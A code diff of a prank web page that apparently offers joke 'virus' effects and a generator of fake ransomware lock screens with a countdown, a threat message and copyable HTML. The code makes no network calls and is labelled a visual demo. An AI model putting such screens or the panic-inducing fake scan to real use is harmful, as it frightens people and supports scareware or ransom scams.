+    <div class="glass p-5 flex flex-col gap-3">
+      <div class="flex items-center gap-3"><span style="font-size:32px;">🟩</span>
+        <div><div class="font-bold" style="font-family:'JetBrains Mono',monospace;">MatrixRain.sh</div><div class="badge badge-green" style="margin-top:4px;">VISUAL</div></div>
+      </div>
+      <p style="font-size:12px;color:rgba(255,255,255,.5);line-height:1.6;">Full-screen Matrix green code rain. Classic hacker aesthetic, runs in canvas overlay.</p>
+      <button class="btn-gen" style="border-color:rgba(50,255,100,.3);color:#6bff8e;" onclick="startMatrix()">▶ ENTER THE MATRIX</button>
+    </div>
+
+    <!-- SCREEN SHAKE -->
+    <div class="glass p-5 flex flex-col gap-3">
+      <div class="flex items-center gap-3"><span style="font-size:32px;">📳</span>
+        <div><div class="font-bold" style="font-family:'JetBrains Mono',monospace;">EarthQuake.exe</div><div class="badge badge-yellow" style="margin-top:4px;">PRANK</div></div>
+      </div>
+      <p style="font-size:12px;color:rgba(255,255,255,.5);line-height:1.6;">Makes the entire page violently shake like an earthquake for a few seconds.</p>
+      <button class="btn-gen btn-danger" onclick="runShake()">▶ SHAKE IT</button>
+    </div>
+
+    <!-- FAKE VIRUS SCAN -->
+    <div class="glass p-5 flex flex-col gap-3">
+      <div class="flex items-center gap-3"><span style="font-size:32px;">🔍</span>
+        <div><div class="font-bold" style="font-family:'JetBrains Mono',monospace;">FakeScan.exe</div><div class="badge" style="margin-top:4px;">CLASSIC</div></div>
+      </div>
+      <p style="font-size:12px;color:rgba(255,255,255,.5);line-height:1.6;">Opens a fake antivirus scan popup that finds hundreds of fake threats and panics the user.</p>
+      <button class="btn-gen" onclick="runFakeScan()">▶ SCAN NOW</button>
+    </div>
+
+    <!-- WINDOW FLOOD -->
+    <div class="glass p-5 flex flex-col gap-3">
+      <div class="flex items-center gap-3"><span style="font-size:32px;">🗂️</span>
+        <div><div class="font-bold" style="font-family:'JetBrains Mono',monospace;">WindowFlood.exe</div><div class="badge badge-red" style="margin-top:4px;">FLOOD</div></div>
+      </div>
+      <p style="font-size:12px;color:rgba(255,255,255,.5);line-height:1.6;">Floods the screen with hundreds of tiny draggable fake Windows windows. Pure chaos.</p>
+      <div class="flex gap-2">
+        <button class="btn-gen btn-danger" style="flex:1;" onclick="startWindowFlood()">▶ FLOOD</button>
+        <button class="btn-gen" style="flex:1;font-size:12px;" onclick="stopWindowFlood()">■ STOP</button>
+      </div>
+    </div>
+
+    <!-- CURSOR HIJACK -->
+    <div class="glass p-5 flex flex-col gap-3">
+      <div class="flex items-center gap-3"><span style="font-size:32px;">🖱️</span>
+        <div><div class="font-bold" style="font-family:'JetBrains Mono',monospace;">CursorChaos.js</div><div class="badge badge-purple" style="margin-top:4px;">PRANK</div></div>
+      </div>
+      <p style="font-size:12px;color:rgba(255,255,255,.5);line-height:1.6;">Spawns dozens of fake emoji cursors that follow your real cursor in a chaotic swarm.</p>
+      <div class="flex gap-2">
+        <button class="btn-gen" style="flex:1;border-color:rgba(180,50,255,.3);color:#cc88ff;" onclick="startCursorChaos()">▶ CHAOS</button>
+        <button class="btn-gen" style="flex:1;font-size:12px;" onclick="stopCursorChaos()">■ STOP</button>
+      </div>
+    </div>
+
+    <!-- FAKE DOWNLOAD -->
+    <div class="glass p-5 flex flex-col gap-3">
+      <div class="flex items-center gap-3"><span style="font-size:32px;">📥</span>
+        <div><div class="font-bold" style="font-family:'JetBrains Mono',monospace;">FakeDownload.php</div><div class="badge" style="margin-top:4px;">CLASSIC</div></div>
+      </div>
+      <p style="font-size:12px;color:rgba(255,255,255,.5);line-height:1.6;">Shows a fake download progress notification. Ends with "VIRUS INSTALLED SUCCESSFULLY 😈".</p>
+      <button class="btn-gen" onclick="runFakeDownload()">▶ DOWNLOAD</button>
+    </div>
+
+    <!-- RICKROLL -->
+    <div class="glass p-5 flex flex-col gap-3">
+      <div class="flex items-center gap-3"><span style="font-size:32px;">🎵</span>
+        <div><div class="font-bold" style="font-family:'JetBrains Mono',monospace;">rickroll.bat</div><div class="badge badge-yellow" style="margin-top:4px;">LEGEND</div></div>
+      </div>
+      <p style="font-size:12px;color:rgba(255,255,255,.5);line-height:1.6;">A fake terminal that pretends to install software, then reveals you've been rickrolled.</p>
+      <button class="btn-gen" style="border-color:rgba(255,200,50,.3);color:#ffd36b;" onclick="runRickroll()">▶ INSTALL UPDATES</button>
+    </div>
+
+    <!-- FAKE FORMAT -->
+    <div class="glass p-5 flex flex-col gap-3">
+      <div class="flex items-center gap-3"><span style="font-size:32px;">💾</span>
+        <div><div class="font-bold" style="font-family:'JetBrains Mono',monospace;">format_C.bat</div><div class="badge badge-red" style="margin-top:4px;">CLASSIC</div></div>
+      </div>
+      <p style="font-size:12px;color:rgba(255,255,255,.5);line-height:1.6;">Fake "Formatting C:\" terminal animation. Completely harmless but looks terrifying.</p>
+      <button class="btn-gen btn-danger" onclick="runFakeFormat()">▶ FORMAT C:\</button>
+    </div>
+
+    <!-- FAKE HACKER -->
+    <div class="glass p-5 flex flex-col gap-3">
+      <div class="flex items-center gap-3"><span style="font-size:32px;">👨‍💻</span>
+        <div><div class="font-bold" style="font-family:'JetBrains Mono',monospace;">im_hacking_u.sh</div><div class="badge badge-purple" style="margin-top:4px;">CRINGE</div></div>
+      </div>
+      <p style="font-size:12px;color:rgba(255,255,255,.5);line-height:1.6;">A fake hacking terminal with dramatic "I am in your system" messages and fake IP traces.</p>
+      <button class="btn-gen" style="border-color:rgba(180,50,255,.3);color:#cc88ff;" onclick="runFakeHacker()">▶ START HACK</button>
+    </div>
+
+    <!-- EMOJI RAIN -->
+    <div class="glass p-5 flex flex-col gap-3">
+      <div class="flex items-center gap-3"><span style="font-size:32px;">🌧️</span>
+        <div><div class="font-bold" style="font-family:'JetBrains Mono',monospace;">EmojiRain.js</div><div class="badge badge-green" style="margin-top:4px;">FUN</div></div>
+      </div>
+      <p style="font-size:12px;color:rgba(255,255,255,.5);line-height:1.6;">Rains hundreds of random emojis down the screen like a chaotic confetti bomb.</p>
+      <div class="flex gap-2">
+        <button class="btn-gen" style="flex:1;border-color:rgba(50,255,100,.3);color:#6bff8e;" onclick="startEmojiRain()">▶ RAIN</button>
+        <button class="btn-gen" style="flex:1;font-size:12px;" onclick="stopEmojiRain()">■ STOP</button>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- JOKE TERMINAL OUTPUT -->
+  <div class="glass" style="overflow:hidden;">
+    <div class="win-titlebar">
+      <div class="win-btn win-close"></div><div class="win-btn win-min"></div><div class="win-btn win-max"></div>
+      <div class="win-title">Joke Virus Output Terminal</div>
+    </div>
+    <div class="terminal" style="height:200px;overflow-y:auto;" id="joke-terminal">
+      <div><span class="ok">[JOKEVIRUS LAB]</span> <span class="out">Ready. Select a joke virus to activate.</span></div>
+      <div><span class="out">All effects run in-page. Nothing is actually installed or executed on your system.</span></div>
+      <div><span class="cursor"></span></div>
+    </div>
+  </div>
+</div>
+
+</div><!-- /main -->
 
 <script>
-// ═══════════════════════════════════════════════
-//  UTILITIES
-// ═══════════════════════════════════════════════
-function showNotif(msg, icon = '✅') {
+'use strict';
+
+// ─────────────────────────────────────────
+//  UTILS
+// ─────────────────────────────────────────
+function showNotif(msg, icon='✅') {
   const n = document.getElementById('notif');
   document.getElementById('notifMsg').textContent = msg;
   document.getElementById('notifIcon').textContent = icon;
@@ -839,7 +620,7 @@ function showNotif(msg, icon = '✅') {
 }
 
 function showPage(p) {
-  ['creator','sandbox','viruses'].forEach(id => {
+  ['creator','sandbox','viruses','jokes'].forEach(id => {
     document.getElementById('page-'+id).classList.remove('active');
     document.getElementById('nav-'+id).classList.remove('active');
   });
@@ -847,12 +628,13 @@ function showPage(p) {
   document.getElementById('nav-'+p).classList.add('active');
 }
 
-// ═══════════════════════════════════════════════
-//  CLOCKS
-// ═══════════════════════════════════════════════
+function formatTime(s) {
+  s = Math.max(0, s);
+  return [Math.floor(s/3600), Math.floor(s%3600/60), s%60].map(n=>String(n).padStart(2,'0')).join(':');
+}
+
 function updateClocks() {
-  const now = new Date();
-  const t = now.toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit'});
+  const t = new Date().toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit'});
   const wc = document.getElementById('win-clock');
   const mc = document.getElementById('mac-clock');
   if(wc) wc.textContent = t;
@@ -860,20 +642,28 @@ function updateClocks() {
 }
 setInterval(updateClocks, 1000); updateClocks();
 
-// ═══════════════════════════════════════════════
-//  WINLOCKER CREATOR
-// ═══════════════════════════════════════════════
-let lockerTimer = 86400;
-let timerInterval = null;
-let currentLockerConfig = {};
+function jTerm(msg, cls='out') {
+  const t = document.getElementById('joke-terminal');
+  if(!t) return;
+  const d = document.createElement('div');
+  d.innerHTML = `<span class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}</span>`;
+  t.insertBefore(d, t.lastElementChild);
+  t.scrollTop = t.scrollHeight;
+}
 
+// ─────────────────────────────────────────
+//  WINLOCKER CREATOR
+// ─────────────────────────────────────────
 const themeColors = {
-  red:   { bg:'#0a0000', accent:'#ff0000', text:'#ff4444', glow:'rgba(255,0,0,0.8)' },
-  blue:  { bg:'#000a14', accent:'#0055ff', text:'#4488ff', glow:'rgba(0,100,255,0.8)' },
-  green: { bg:'#000a00', accent:'#00ff44', text:'#44ff88', glow:'rgba(0,255,100,0.8)' },
-  skull: { bg:'#0d0d0d', accent:'#cc00cc', text:'#ff44ff', glow:'rgba(200,0,200,0.8)' },
-  fbi:   { bg:'#000814', accent:'#003380', text:'#6699ff', glow:'rgba(0,50,160,0.8)' },
+  red:   {bg:'#080000', accent:'#ff0000', text:'#ff4444', glow:'rgba(255,0,0,.8)'},
+  blue:  {bg:'#000814', accent:'#0055ff', text:'#4488ff', glow:'rgba(0,100,255,.8)'},
+  green: {bg:'#000a00', accent:'#00ff44', text:'#44ff88', glow:'rgba(0,255,100,.8)'},
+  skull: {bg:'#0d0d0d', accent:'#cc00cc', text:'#ff44ff', glow:'rgba(200,0,200,.8)'},
+  fbi:   {bg:'#000814', accent:'#003380', text:'#6699ff', glow:'rgba(0,50,160,.8)'},
 };
+
+let lockerTimerInterval = null;
+let currentLockerConfig = {};
 
 function buildLocker() {
   const cfg = {
@@ -883,7 +673,7 @@ function buildLocker() {
     sub:       document.getElementById('cfg-sub').value || '',
     timer:     parseInt(document.getElementById('cfg-timer').value) || 86400,
     theme:     document.getElementById('cfg-theme').value,
-    btntext:   document.getElementById('cfg-btntext').value || 'PAY NOW',
+    btntext:   document.getElementById('cfg-btntext').value || '[CODE ONLY — VISUAL DEMO]',
     btn2:      document.getElementById('cfg-btn2').value || '',
     icon:      document.getElementById('cfg-icon').value || '☠️',
     os:        document.getElementById('cfg-os').value,
@@ -895,134 +685,128 @@ function buildLocker() {
   currentLockerConfig = cfg;
   renderLockerPreview(cfg);
   renderCodeOutput(cfg);
-  showNotif('WinLocker generated!', '☣️');
+  showNotif('WinLocker preview generated!', '☣️');
 }
 
 function renderLockerPreview(cfg) {
   const tc = themeColors[cfg.theme];
-  lockerTimer = cfg.timer;
 
   // Titlebar
   const tb = document.getElementById('preview-titlebar');
   if(cfg.os === 'windows') {
-    tb.innerHTML = `<div class="win-titlebar" style="background:rgba(10,10,10,0.98);">
+    tb.innerHTML = `<div class="win-titlebar" style="background:rgba(8,0,0,.99);">
       <div class="win-btn win-close"></div><div class="win-btn win-min"></div><div class="win-btn win-max"></div>
       <div class="win-title" style="color:${tc.text};">${cfg.virusname} — ${cfg.title}</div>
     </div>`;
   } else if(cfg.os === 'mac') {
-    tb.innerHTML = `<div class="mac-titlebar" style="background:rgba(10,10,10,0.98);">
+    tb.innerHTML = `<div class="mac-titlebar" style="background:rgba(8,0,0,.99);">
       <div class="win-btn win-close"></div><div class="win-btn win-min"></div><div class="win-btn win-max"></div>
       <div class="win-title" style="color:${tc.text};">${cfg.title}</div>
     </div>`;
   } else {
-    tb.innerHTML = `<div class="linux-titlebar" style="background:rgba(10,10,10,0.98);">
+    tb.innerHTML = `<div class="linux-titlebar" style="background:rgba(8,0,0,.99);">
       <div class="linux-title" style="color:${tc.text};">${cfg.virusname} — ${cfg.title}</div>
       <div class="linux-btns"><div class="linux-btn">✕</div></div>
     </div>`;
   }
 
-  // Locker body
+  // Body
   const locker = document.getElementById('preview-locker');
   locker.style.background = tc.bg;
-  const glitchClass = cfg.fxGlitch ? 'glitch' : '';
-  const pulseAnim = cfg.fxPulse ? '' : 'animation:none;';
+  const gc = cfg.fxGlitch ? 'glitch' : '';
+  const pa = cfg.fxPulse ? '' : 'animation:none;';
 
+  // Buttons are purely cosmetic — no onclick that does anything payment-related
   locker.innerHTML = `
     ${cfg.fxBgscan ? '<div class="danger-bg"></div>' : ''}
-    ${cfg.fxScan ? '<div class="scan-line" style="opacity:0.4;"></div>' : ''}
-    <div style="position:relative;z-index:5;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:32px;text-align:center;gap:0;">
-      <div class="${glitchClass}" style="font-size:72px; ${pulseAnim} filter:drop-shadow(0 0 24px ${tc.glow});">${cfg.icon}</div>
-      <div class="locker-timer" id="preview-timer" style="color:${tc.accent}; text-shadow:0 0 30px ${tc.glow};">${formatTime(cfg.timer)}</div>
-      <div class="locker-msg ${glitchClass}" style="color:#fff; margin-top:16px;">${cfg.title}</div>
-      <div style="font-size:13px; color:${tc.text}; font-family:'JetBrains Mono',monospace; margin-top:8px; max-width:420px; line-height:1.7;">${cfg.msg}</div>
-      <div style="font-size:11px; color:rgba(255,200,200,0.6); font-family:'JetBrains Mono',monospace; margin-top:6px; word-break:break-all; max-width:400px;">${cfg.sub}</div>
-      <div style="display:flex; gap:12px; margin-top:24px; flex-wrap:wrap; justify-content:center;">
-        <button class="locker-btn-pay" style="border-color:${tc.accent}; color:${tc.text}; background:${tc.accent}22; box-shadow:0 0 20px ${tc.glow}40;" onclick="void(0)">${cfg.btntext}</button>
-        ${cfg.btn2 ? `<button class="locker-btn-pay" style="border-color:rgba(255,255,255,0.2); color:rgba(255,255,255,0.5); background:rgba(255,255,255,0.03); animation:none;" onclick="void(0)">${cfg.btn2}</button>` : ''}
+    ${cfg.fxScan   ? '<div class="scan-line" style="opacity:.4;"></div>' : ''}
+    <div style="position:relative;z-index:5;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:28px;text-align:center;">
+      <div class="${gc}" style="font-size:68px;${pa}filter:drop-shadow(0 0 24px ${tc.glow});">${cfg.icon}</div>
+      <div style="font-family:'JetBrains Mono',monospace;font-size:48px;font-weight:700;color:${tc.accent};text-shadow:0 0 28px ${tc.glow};letter-spacing:4px;margin-top:8px;" id="preview-timer">${formatTime(cfg.timer)}</div>
+      <div class="${gc}" style="font-size:16px;font-weight:700;color:#fff;margin-top:14px;">${cfg.title}</div>
+      <div style="font-size:13px;color:${tc.text};font-family:'JetBrains Mono',monospace;margin-top:8px;max-width:420px;line-height:1.7;">${cfg.msg}</div>
+      <div style="font-size:11px;color:rgba(255,255,255,.35);font-family:'JetBrains Mono',monospace;margin-top:6px;word-break:break-all;max-width:400px;">${cfg.sub}</div>
+      <div style="display:flex;gap:10px;margin-top:20px;flex-wrap:wrap;justify-content:center;">
+        <div style="padding:11px 28px;border:2px solid ${tc.accent};border-radius:8px;color:${tc.text};font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:700;background:${tc.accent}18;animation:glowBtn 2s infinite;cursor:default;" title="Visual only — no payment">${cfg.btntext}</div>
+        ${cfg.btn2 ? `<div style="padding:11px 28px;border:2px solid rgba(255,255,255,.15);border-radius:8px;color:rgba(255,255,255,.45);font-family:'JetBrains Mono',monospace;font-size:13px;cursor:default;">${cfg.btn2}</div>` : ''}
       </div>
-      <div style="margin-top:20px; font-family:'JetBrains Mono',monospace; font-size:10px; color:rgba(255,255,255,0.2);">${cfg.virusname} | PID: ${Math.floor(Math.random()*9000)+1000} | Encrypted: ${Math.floor(Math.random()*9000)+500} files</div>
-    </div>
-  `;
+      <div style="margin-top:14px;font-family:'JetBrains Mono',monospace;font-size:9px;color:rgba(255,255,255,.18);">${cfg.virusname} | PID:${Math.floor(Math.random()*8000)+1000} | Files:${Math.floor(Math.random()*4000)+500} | [VISUAL DEMO ONLY]</div>
+    </div>`;
 
-  // Start timer
-  if(timerInterval) clearInterval(timerInterval);
-  let remaining = cfg.timer;
-  timerInterval = setInterval(() => {
-    remaining = Math.max(0, remaining - 1);
+  if(lockerTimerInterval) clearInterval(lockerTimerInterval);
+  let rem = cfg.timer;
+  lockerTimerInterval = setInterval(() => {
+    rem = Math.max(0, rem-1);
     const el = document.getElementById('preview-timer');
-    if(el) el.textContent = formatTime(remaining);
-    if(remaining <= 0) clearInterval(timerInterval);
+    if(el) el.textContent = formatTime(rem);
+    if(rem <= 0) clearInterval(lockerTimerInterval);
   }, 1000);
-}
-
-function formatTime(s) {
-  const h = Math.floor(s/3600);
-  const m = Math.floor((s%3600)/60);
-  const sec = s%60;
-  return `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(sec).padStart(2,'0')}`;
 }
 
 function renderCodeOutput(cfg) {
   const tc = themeColors[cfg.theme];
-  const code = `&lt;!DOCTYPE html&gt;
+  // Generate readable demo code (escaped for display)
+  const code =
+`&lt;!-- EDUCATIONAL DEMO — NO REAL FUNCTIONALITY --&gt;
+&lt;!DOCTYPE html&gt;
 &lt;html&gt;&lt;head&gt;
-&lt;title&gt;${cfg.virusname}&lt;/title&gt;
-&lt;style&gt;
-  body{margin:0;background:${tc.bg};font-family:monospace;display:flex;
-    align-items:center;justify-content:center;height:100vh;overflow:hidden;}
-  .icon{font-size:80px;animation:pulse 2s infinite;}
-  .timer{font-size:52px;font-weight:700;color:${tc.accent};
-    text-shadow:0 0 30px ${tc.glow};letter-spacing:4px;}
-  .msg{font-size:16px;font-weight:600;color:#fff;max-width:400px;text-align:center;}
-  .btn{padding:12px 36px;border:2px solid ${tc.accent};
-    border-radius:8px;color:${tc.text};font-size:14px;
-    cursor:pointer;background:${tc.accent}22;margin-top:24px;}
-  @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
-&lt;/style&gt;&lt;/head&gt;
-&lt;body&gt;&lt;div style="text-align:center"&gt;
-  &lt;div class="icon"&gt;${cfg.icon}&lt;/div&gt;
-  &lt;div class="timer" id="t"&gt;${formatTime(cfg.timer)}&lt;/div&gt;
-  &lt;div class="msg"&gt;${cfg.title}&lt;/div&gt;
-  &lt;p style="color:${tc.text};font-size:13px;max-width:420px"&gt;${cfg.msg}&lt;/p&gt;
-  &lt;p style="color:#666;font-size:11px"&gt;${cfg.sub}&lt;/p&gt;
-  &lt;button class="btn"&gt;${cfg.btntext}&lt;/button&gt;
-&lt;/div&gt;
-&lt;script&gt;
-  let s=${cfg.timer};
-  setInterval(()=>{s=Math.max(0,s-1);
-    const h=Math.floor(s/3600),m=Math.floor(s%3600/60),sec=s%60;
-    document.getElementById('t').textContent=
-    [h,m,sec].map(n=>String(n).padStart(2,'0')).join(':');},1000);
-&lt;/sc` + `ript&gt;&lt;/body&gt;&lt;/html&gt;`;
+  &lt;title&gt;${cfg.virusname} [FAKE DEMO]&lt;/title&gt;
+  &lt;style&gt;
+    body { margin:0; background:${tc.bg}; font-family:monospace;
+           display:flex; align-items:center; justify-content:center;
+           height:100vh; overflow:hidden; }
+    .icon { font-size:80px; animation:pulse 2s infinite; }
+    .timer { font-size:52px; font-weight:700; color:${tc.accent};
+             text-shadow:0 0 30px ${tc.glow}; letter-spacing:4px; }
+    .title { font-size:18px; color:#fff; font-weight:700; }
+    .msg   { font-size:13px; color:${tc.text}; max-width:420px; text-align:center; line-height:1.7; }
+    /* Buttons are DISPLAY ONLY — no href, no onclick, no payment */
+    .btn   { padding:12px 36px; border:2px solid ${tc.accent};
+             border-radius:8px; color:${tc.text}; font-size:14px;
+             cursor:default; background:${tc.accent}18; margin-top:24px;
+             display:inline-block; }
+    @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.08)} }
+  &lt;/style&gt;
+&lt;/head&gt;&lt;body&gt;
+  &lt;div style="text-align:center;"&gt;
+    &lt;div class="icon"&gt;${cfg.icon}&lt;/div&gt;
+    &lt;div class="timer" id="t"&gt;${formatTime(cfg.timer)}&lt;/div&gt;
+    &lt;div class="title"&gt;${cfg.title}&lt;/div&gt;
+    &lt;div class="msg"&gt;${cfg.msg}&lt;/div&gt;
+    &lt;div style="font-size:11px;color:#555;margin-top:8px;"&gt;${cfg.sub}&lt;/div&gt;
+    &lt;!-- NO onclick / href / payment on button --&gt;
+    &lt;div class="btn"&gt;${cfg.btntext}&lt;/div&gt;
+  &lt;/div&gt;
+  &lt;script&gt;
+    let s = ${cfg.timer};
+    setInterval(() =&gt; {
+      s = Math.max(0, s - 1);
+      const h=Math.floor(s/3600), m=Math.floor(s%3600/60), sec=s%60;
+      document.getElementById('t').textContent =
+        [h,m,sec].map(n =&gt; String(n).padStart(2,'0')).join(':');
+    }, 1000);
+  &lt;/sc` + `ript&gt;
+&lt;/body&gt;&lt;/html&gt;`;
 
   document.getElementById('code-output').innerHTML =
-    `<pre style="white-space:pre-wrap;word-break:break-all;color:#888;font-size:11px;">${code}</pre>`;
+    `<pre style="white-space:pre-wrap;word-break:break-all;color:#888;font-size:11px;line-height:1.6;">${code}</pre>`;
 }
 
 function copyCode() {
-  const text = document.getElementById('code-output').innerText;
-  navigator.clipboard.writeText(text).then(() => showNotif('Code copied!','📋'));
+  navigator.clipboard.writeText(document.getElementById('code-output').innerText)
+    .then(() => showNotif('Code copied!','📋'));
 }
 
 function deployToSandbox() {
-  if(!currentLockerConfig.title) { buildLocker(); }
+  if(!currentLockerConfig.title) buildLocker();
   showPage('sandbox');
   showNotif('Deployed to sandbox!','🚀');
-  setTimeout(() => infectSandboxWithConfig(currentLockerConfig), 600);
+  setTimeout(() => infectSandboxWithConfig(currentLockerConfig), 500);
 }
 
-// Initial preview render
-window.addEventListener('load', () => {
-  buildLocker();
-  renderVirusList();
-  renderProcessTable();
-  startNetMonitor();
-  startActivityLog();
-});
-
-// ═══════════════════════════════════════════════
-//  SANDBOX - WINDOWS
-// ═══════════════════════════════════════════════
+// ─────────────────────────────────────────
+//  SANDBOX
+// ─────────────────────────────────────────
 function switchSandbox(os) {
   ['windows','linux','mac'].forEach(o => {
     document.getElementById('sandbox-'+o).style.display = 'none';
@@ -1032,508 +816,331 @@ function switchSandbox(os) {
   document.getElementById('sb-'+os).classList.add('active');
 }
 
-let appZIndex = 10;
-
+let appZ = 10;
 function openApp(app) {
   const container = document.getElementById('win-apps');
-  const id = 'app-' + app + '-' + Date.now();
-  appZIndex++;
-  let title = '', content = '';
+  appZ++;
+  const id = 'app-' + Date.now();
+  let title='', content='';
 
-  if(app === 'notepad') {
-    title = '📝 Notepad — untitled.txt';
-    content = `<textarea style="width:100%;height:calc(100% - 2px);background:#1a1a1a;color:#e0e0e0;border:none;padding:12px;font-family:'JetBrains Mono',monospace;font-size:12px;resize:none;outline:none;" placeholder="Type here...">SalienWin.exe v3.2 — Activity Log
-[${new Date().toISOString()}] Initializing encryption module...
-[${new Date().toISOString()}] Scanning directories...
-[${new Date().toISOString()}] Found 1,847 files to encrypt
-[${new Date().toISOString()}] Encryption key generated: 0xFA4C...
+  if(app==='notepad') {
+    title='📝 Notepad — untitled.txt';
+    content=`<textarea style="width:100%;height:calc(100% - 2px);background:#1a1a1a;color:#e0e0e0;border:none;padding:12px;font-family:'JetBrains Mono',monospace;font-size:12px;resize:none;outline:none;">SalienWin.exe v3.2 — Fake Activity Log
+[${new Date().toISOString()}] Initializing fake encryption module...
+[${new Date().toISOString()}] Scanning fake directories...
+[${new Date().toISOString()}] Found 1,847 files to fake-encrypt
+[${new Date().toISOString()}] THIS IS A DEMO — NO REAL ACTION TAKEN
 </textarea>`;
-  } else if(app === 'explorer') {
-    title = '📁 File Explorer';
-    content = `<div style="display:flex;height:100%;">
-      <div style="width:140px;background:rgba(255,255,255,0.02);border-right:1px solid rgba(255,255,255,0.06);padding:8px;font-size:11px;">
-        <div style="color:rgba(255,255,255,0.4);padding:4px;">📌 Quick access</div>
-        <div style="padding:4px 8px;color:rgba(255,255,255,0.7);cursor:pointer;">🖥️ Desktop</div>
-        <div style="padding:4px 8px;color:rgba(255,255,255,0.7);cursor:pointer;">📥 Downloads</div>
-        <div style="padding:4px 8px;color:rgba(255,255,255,0.7);cursor:pointer;">📄 Documents</div>
-        <div style="padding:4px 8px;color:rgba(255,255,255,0.7);cursor:pointer;">🖼️ Pictures</div>
-        <div style="padding:4px 8px;color:#ff6666;cursor:pointer;">☠️ ENCRYPTED</div>
+  } else if(app==='explorer') {
+    title='📁 File Explorer';
+    content=`<div style="display:flex;height:100%;font-size:11px;font-family:'JetBrains Mono',monospace;">
+      <div style="width:130px;background:rgba(255,255,255,.02);border-right:1px solid rgba(255,255,255,.06);padding:8px;">
+        <div style="color:rgba(255,255,255,.3);padding:4px;">📌 Quick access</div>
+        <div style="padding:4px 8px;color:rgba(255,255,255,.7);">🖥️ Desktop</div>
+        <div style="padding:4px 8px;color:rgba(255,255,255,.7);">📥 Downloads</div>
+        <div style="padding:4px 8px;color:rgba(255,255,255,.7);">📄 Documents</div>
+        <div style="padding:4px 8px;color:#ff6666;">☠️ ENCRYPTED</div>
       </div>
-      <div style="flex:1;padding:12px;display:grid;grid-template-columns:repeat(4,1fr);gap:8px;align-content:start;">
-        ${['passwords.txt.LOCKED','photos.zip.LOCKED','wallet.dat.LOCKED','documents.7z.LOCKED','backup.sql.LOCKED','keys.pem.LOCKED'].map(f=>`<div style="text-align:center;padding:8px;border-radius:6px;background:rgba(255,0,0,0.06);border:1px solid rgba(255,0,0,0.12);cursor:pointer;"><div style="font-size:20px;">🔒</div><div style="font-size:9px;color:#ff6666;margin-top:4px;word-break:break-all;">${f}</div></div>`).join('')}
+      <div style="flex:1;padding:12px;display:grid;grid-template-columns:repeat(3,1fr);gap:8px;align-content:start;">
+        ${['passwords.txt.LOCKED','photos.zip.LOCKED','wallet.dat.LOCKED','documents.7z.LOCKED','backup.sql.LOCKED','keys.pem.LOCKED'].map(f=>`<div style="text-align:center;padding:8px;border-radius:6px;background:rgba(255,0,0,.05);border:1px solid rgba(255,0,0,.1);"><div style="font-size:20px;">🔒</div><div style="font-size:9px;color:#ff6666;margin-top:3px;word-break:break-all;">${f}</div></div>`).join('')}
       </div>
     </div>`;
-  } else if(app === 'cmd') {
-    title = '⬛ C:\\Windows\\System32\\cmd.exe';
-    content = `<div class="terminal" style="height:100%;background:#0c0c0c;">
+  } else if(app==='cmd') {
+    title='⬛ C:\\Windows\\System32\\cmd.exe';
+    content=`<div class="terminal" style="height:100%;background:#0c0c0c;">
       <div style="color:#c0c0c0;">Microsoft Windows [Version 11.0.22631.3007]</div>
-      <div style="color:#c0c0c0;">(c) Microsoft Corporation. All rights reserved.</div><br>
+      <div style="color:#888;">(c) Microsoft Corporation. All rights reserved. [FAKE SANDBOX]</div><br>
       <div><span style="color:#c0c0c0;">C:\\Users\\Victim&gt;</span> <span style="color:#fff;">dir /s /b</span></div>
-      <div style="color:#888;">Volume in drive C has no label.</div>
-      <div style="color:#ff6666;">WARNING: 1847 files encrypted by SalienWin.exe</div>
+      <div style="color:#ff6666;">WARNING: 1847 files fake-encrypted by SalienWin.exe [DEMO]</div>
       <div style="color:#888;">C:\\Users\\Victim\\passwords.txt.LOCKED</div>
       <div style="color:#888;">C:\\Users\\Victim\\Documents\\work.docx.LOCKED</div>
       <div style="color:#888;">C:\\Users\\Victim\\Desktop\\crypto.dat.LOCKED</div>
       <div style="color:#888;">...</div>
       <div><span style="color:#c0c0c0;">C:\\Users\\Victim&gt;</span><span class="cursor"></span></div>
     </div>`;
-  } else if(app === 'task') {
-    title = '📊 Task Manager [FAKE]';
-    content = `<div style="font-size:11px;font-family:'JetBrains Mono',monospace;">
-      <div style="padding:6px 12px;background:rgba(255,255,255,0.03);border-bottom:1px solid rgba(255,255,255,0.06);display:flex;gap:16px;">
-        <span style="color:#fff;">Processes</span><span style="color:rgba(255,255,255,0.4);">Performance</span><span style="color:rgba(255,255,255,0.4);">Details</span>
+  } else if(app==='task') {
+    title='📊 Task Manager [FAKE]';
+    content=`<div style="font-size:11px;font-family:'JetBrains Mono',monospace;">
+      <div style="padding:6px 12px;background:rgba(255,255,255,.03);border-bottom:1px solid rgba(255,255,255,.06);display:flex;gap:16px;">
+        <span style="color:#fff;">Processes</span><span style="color:rgba(255,255,255,.4);">Performance</span><span style="color:rgba(255,255,255,.4);">Details</span>
       </div>
       <table style="width:100%;border-collapse:collapse;">
-        <tr style="color:rgba(255,255,255,0.4);border-bottom:1px solid rgba(255,255,255,0.05);">
-          <td style="padding:6px 12px;">Name</td><td style="padding:6px;">CPU</td><td style="padding:6px;">Memory</td>
-        </tr>
-        ${[
-          ['SalienWin.exe','🔴','98.2%','487 MB'],
-          ['System Idle Process','','0.1%','0.1 MB'],
-          ['explorer.exe','','1.2%','34 MB'],
-          ['svchost.exe','','0.5%','22 MB'],
-          ['chrome.exe','','2.1%','320 MB'],
-          ['csrss.exe','','0.0%','2.3 MB'],
-        ].map(([n,flag,cpu,mem])=>`<tr style="border-bottom:1px solid rgba(255,255,255,0.03);${n==='SalienWin.exe'?'background:rgba(255,0,0,0.06);':''}">
-          <td style="padding:5px 12px;color:${n==='SalienWin.exe'?'#ff6666':'#e0e0e0'};">${flag} ${n}</td>
-          <td style="padding:5px;color:#e0e0e0;">${cpu}</td>
-          <td style="padding:5px;color:#e0e0e0;">${mem}</td>
-        </tr>`).join('')}
